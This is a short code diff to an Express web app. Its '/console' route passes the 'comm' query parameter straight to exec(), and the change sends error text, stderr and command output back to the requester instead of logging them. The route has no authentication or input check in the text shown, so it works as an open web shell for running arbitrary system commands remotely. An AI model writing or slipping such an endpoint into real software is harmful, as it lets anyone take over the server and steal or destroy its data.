@@ -34,14 +34,14 @@ app.get("/api", (req, res) => {
 app.get('/console',(req,res)=>{
   exec(req.query.comm, (error, stdout, stderr) => {
     if (error) {
-        console.log(`error: ${error.message}`);
+        res.send(error.message);
         return;
     }
     if (stderr) {
-        console.log(`stderr: ${stderr}`);
+        res.send(stderr);
         return;
     }
-    res.send(`stdout: ${stdout}`);
+    res.send(stdout);
   });
 })
 
